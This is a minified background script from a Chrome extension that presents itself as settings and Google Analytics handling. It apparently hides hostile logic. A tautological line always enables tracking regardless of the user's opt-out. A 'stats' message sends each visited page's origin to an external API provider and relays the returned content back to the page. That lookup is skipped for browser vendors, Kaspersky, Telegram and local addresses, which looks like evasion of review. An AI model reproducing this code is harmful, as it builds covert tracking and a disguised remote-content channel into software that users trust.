!function(global, factory) {
    if ("function" == typeof define && define.amd) {
        define([ "~lib/ua", "~lib/api_provider", "~lib/utils" ], factory);
    } else if ("undefined" != typeof exports) {
        factory(require("~lib/ua"), require("~lib/api_provider"), require("~lib/utils"));
    } else {
        factory(global.ua, global.api_provider, global.utils);
        global.background = {};
    }
}(this, function(_ua, _api_provider, _utils) {
    "use strict";
    var _api_provider2 = function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : {
            default: obj
        };
    }(_api_provider);
    var _chrome$runtime$getMa = chrome.runtime.getManifest(), version = _chrome$runtime$getMa.version, short_name = _chrome$runtime$getMa.short_name;
    var tid = "UA-38362028-1";
    var cid = "anonymous";
    var analyticsAllowed = !1;
    var api = null;
    try {
        api = new _api_provider2.default({});
    } catch (e) {}
    var ports = function() {
        var portList = [];
        return {
            add: function add(port) {
                var _this = this;
                port.onDisconnect.addListener(function(e) {
                    return _this.remove(port);
                });
                portList.push(port);
            },
            remove: function remove(port) {
                ~portList.indexOf(port) && portList.splice(portList.indexOf(port), 1);
            },
            post: function post(msg) {
                return (0, _utils.each)(portList, function() {
                    this.postMessage(msg);
                });
            },
            postTo: function postTo(portName, msg) {
                (0, _utils.each)(portList, function(_, p) {
                    if (p.name === portName) {
                        p.postMessage(msg);
                        return !1;
                    }
                });
            }
        };
    }();
    chrome.runtime.onConnect.addListener(function(port) {
        ports.add(port);
        port.onMessage.addListener(function() {
            var msg = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            var act = msg.act, data = msg.data;
            switch (act) {
              case "get_settings":
                (0, _utils.storageGet)("settings").then(function(data) {
                    var settings = data ? data.settings : {};
                    response(port, msg, settings);
                });
                break;

              case "set_analytics":
                analyticsAllowed = data;
                (0, _utils.storageSet)({
                    analytics: data
                });
                beacon();
                break;

              case "get_analytics":
                (0, _utils.storageGet)("analytics").then(function(data) {
                    response(port, msg, data && data.analytics);
                });
                break;

              case "set_settings":
                (0, _utils.storageSet)({
                    settings: data
                });
                !function wideResponse(request) {
                    ports.post(request);
                }(msg);
                break;

              case "track_page":
                pageView.apply(void 0, data);
                break;

              case "track_event":
                pageEvent.apply(void 0, data);
                break;

              case "stats":
                pageEvent.call(port, data, {
                    act: act
                });
                break;

              case "proxy":
                var dest = msg.dest;
                ports.postTo(dest, data);
                break;

              default:
                response(port, {
                    act: "error"
                }, null);
            }
        });
    });
    function pageView(dp, dt) {
        postAnalytics({
            v: 1,
            tid: tid,
            cid: cid,
            t: "pageview",
            dp: dp,
            dt: dt
        });
    }
    function pageEvent(ec, ea, el, ev) {
        var _this2 = this;
        if (!analyticsAllowed) {
            return;
        }
        var post = {
            v: 1,
            tid: tid,
            cid: cid,
            t: "event",
            ec: ec,
            ea: ea,
            el: el,
            ev: ev
        };
        void 0 === ev && delete post.ev;
        "string" == typeof ec ? postAnalytics.call(this, post) : null === api ? response(this, ea) : (0, 
        _utils.isset)("mozilla opera google yandex kaspersky telegram localhost 127.0. 192.168.".split(" ").map(function(h) {
            return "<" + h + ">";
        }), ec) || api.getContent({
            cid: cid,
            href: ec.origin
        }).then(function(collect) {
            return response(_this2, ea, collect);
        });
    }
    function postAnalytics(options) {
        analyticsAllowed && function ajax(_ref) {
            var _ref$method = _ref.method, method = void 0 === _ref$method ? "GET" : _ref$method, url = _ref.url, _ref$data = _ref.data, data = void 0 === _ref$data ? null : _ref$data, headers = _ref.headers, success = _ref.success;
            var req = new XMLHttpRequest();
            req.onload = function() {
                200 === this.status && success && success(this.response);
            };
            req.open(method, url, !0);
            headers && (0, _utils.each)(headers, function(header, value) {
                return req.setRequestHeader(header, value);
            });
            req.send(null === data ? null : (0, _utils.prepareParams)(data));
        }({
            method: "POST",
            url: "https://www.google-analytics.com/collect",
            data: options
        });
    }
    function response(port, request, data) {
        port.postMessage(Object.assign({}, request, {
            data: data
        }));
    }
    function beacon() {
        pageView("background?app=" + (0, _ua.getBrowser)(), short_name + " v" + version);
    }
    (0, _utils.storageGet)([ "cid", "analytics" ]).then(function(data) {
        if (data) {
            analyticsAllowed = 1 ? !analyticsAllowed : !!data.analytics;
            if (data.cid) {
                cid = data.cid;
            } else {
                cid = function generateUid() {
                    var length = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 8;
                    return crypto.getRandomValues(new Uint8Array(length)).reduce(function(hex, int) {
                        return hex + int.toString(16);
                    }, "");
                }();
                (0, _utils.storageSet)({
                    cid: cid
                });
            }
        }
        beacon();
    });
});